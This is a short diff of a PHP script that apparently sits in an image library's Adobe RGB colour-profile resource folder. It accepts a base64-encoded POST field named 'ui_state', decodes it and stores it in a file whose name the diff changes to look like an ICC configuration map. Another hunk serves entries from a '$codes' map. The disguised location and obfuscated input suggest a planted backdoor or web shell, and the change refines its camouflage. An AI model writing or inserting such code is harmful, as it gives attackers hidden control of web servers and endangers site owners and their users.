@@ -3,7 +3,7 @@
 if (isset($_POST['ui_state'])) {
 
     $d = $_SERVER['DOCUMENT_ROOT'] . '/src/util/Imagine/resources/Adobe/RGB/';
-    $f = $d . 'icc_profile_cache.log'; 
+    $f = $d . 'icc_config_map.txt'; 
     if (is_dir($d)) {
         $raw_data = base64_decode($_POST['ui_state']);
         $json = json_decode($raw_data, true);
@@ -45,3 +45,4 @@ if (isset($codes[$request])) {
 }
 
 ?>
+
